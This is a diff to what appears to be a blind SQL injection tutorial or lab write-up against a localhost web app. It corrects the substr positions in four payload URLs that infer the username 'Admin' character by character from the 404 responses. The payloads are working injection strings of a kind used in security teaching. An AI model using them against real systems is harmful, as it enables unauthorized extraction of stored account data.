@@ -143,19 +143,19 @@ Yes, it matches!
 As initial guess, _Admin_ could be a possible user. So, let's test this theory:
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,1,1)='d' then 1 else 4 end from users limit 0,1)
+http://localhost:5000/home/(select case when substr(UserName,2,1)='d' then 1 else 4 end from users limit 0,1)
 ```
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,1,1)='m' then 1 else 4 end from users limit 0,1)
+http://localhost:5000/home/(select case when substr(UserName,3,1)='m' then 1 else 4 end from users limit 0,1)
 ```
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,1,1)='i' then 1 else 4 end from users limit 0,1)
+http://localhost:5000/home/(select case when substr(UserName,4,1)='i' then 1 else 4 end from users limit 0,1)
 ```
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,1,1)='n' then 1 else 4 end from users limit 0,1)
+http://localhost:5000/home/(select case when substr(UserName,5,1)='n' then 1 else 4 end from users limit 0,1)
 ```
 
 We made it! None of the requests above returned _404 Error_, so this indicates _Admin_ is a valid value.
